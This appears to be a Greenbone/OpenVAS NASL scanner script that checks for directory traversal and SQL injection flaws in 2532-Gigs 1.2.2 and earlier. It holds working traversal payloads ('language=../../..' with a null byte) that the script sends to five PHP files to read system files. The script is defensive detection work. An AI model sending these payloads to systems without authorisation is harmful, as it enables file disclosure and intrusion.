if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800682" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-08-20 09:27:17 +0200 (Thu, 20 Aug 2009)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2008-6901", "CVE-2008-6902", "CVE-2008-6907" );
	script_bugtraq_id( 32911, 32913 );
	script_name( "2532|Gigs Directory Traversal And SQL Injection Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://milw0rm.com/exploits/7511" );
	script_xref( name: "URL", value: "http://milw0rm.com/exploits/7510" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/26585" );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_category( ACT_MIXED_ATTACK );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_2532gigs_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "2532_gigs/detected" );
	script_tag( name: "affected", value: "2532-Gigs version 1.2.2 and prior." );
	script_tag( name: "insight", value: "- Vulnerability exists in activateuser.php, manage_venues.php,
  mini_calendar.php, deleteuser.php, settings.php, and manage_gigs.php files when
  input passed to the 'language' parameter is not properly verified before being
  used to include files via a .. (dot dot).

  - Input passed to the 'username' and 'password' parameters in checkuser.php
  is not properly sanitised before being used in SQL queries.

  - Error in upload_flyer.php which can be exploited by uploading a file with an
  executable extension, then accessing it via a direct request to the file in flyers/." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running 2532-Gigs and is prone to Directory Traversal and
  SQL Injection Vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to cause directory
  traversal or SQL injection attacks, and can execute arbitrary code when
  register_globals is enabled and magic_quotes_gpc is disabled." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
gigsPort = http_get_port( default: 80 );
gigsVer = get_kb_item( "www/" + gigsPort + "/2532|Gigs" );
gigsVer = eregmatch( pattern: "^(.+) under (/.*)$", string: gigsVer );
if(( gigsVer[2] != NULL ) && ( !safe_checks() )){
	attacks = make_list( "/deleteuser.php?language=../../../../../../../../../../",
		 "/settings.php?language=../../../../../../../../../../",
		 "/mini_calendar?language=../../../../../../../../../../",
		 "/manage_venues.php?language=../../../../../../../../../../",
		 "/manage_gigs.php?language=../../../../../../../../../../" );
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		for attack in attacks {
			url = NASLString( gigsVer[2], attack, file, "%00" );
			sndReq = http_get( item: url, port: gigsPort );
			rcvRes = http_send_recv( port: gigsPort, data: sndReq );
			if(egrep( string: rcvRes, pattern: pattern, icase: FALSE )){
				report = http_report_vuln_url( port: gigsPort, url: url );
				security_message( port: gigsPort, data: report );
				exit( 0 );
			}
		}
	}
}
if(gigsVer[1] != NULL){
	if(version_is_less_equal( version: gigsVer[1], test_version: "1.2.2" )){
		security_message( gigsPort );
	}
}

